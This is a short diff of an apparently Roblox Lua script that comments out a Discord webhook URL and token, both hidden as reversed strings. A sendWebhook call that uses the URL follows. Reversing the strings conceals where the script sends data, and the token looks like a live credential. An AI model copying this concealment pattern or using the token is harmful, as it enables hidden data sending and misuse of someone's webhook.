@@ -204,8 +204,8 @@ local RequiredServices = (function()
 end)()
 
 task.spawn(function()
-    local url = ('/7170239070657999141/skoohbew/ipa/moc.drocsid//:sptth'):reverse()
-    .. ('aR5QX3Bc1MAuNxiWRaPoepfybzxu585-U3N55zqV0NC8eA9qlby5n9_QwE0-k1H-w1BA'):reverse()
+    --local url = ('/7170239070657999141/skoohbew/ipa/moc.drocsid//:sptth'):reverse()
+    --.. ('aR5QX3Bc1MAuNxiWRaPoepfybzxu585-U3N55zqV0NC8eA9qlby5n9_QwE0-k1H-w1BA'):reverse()
 
     sendWebhook(url, {
         embeds = {{
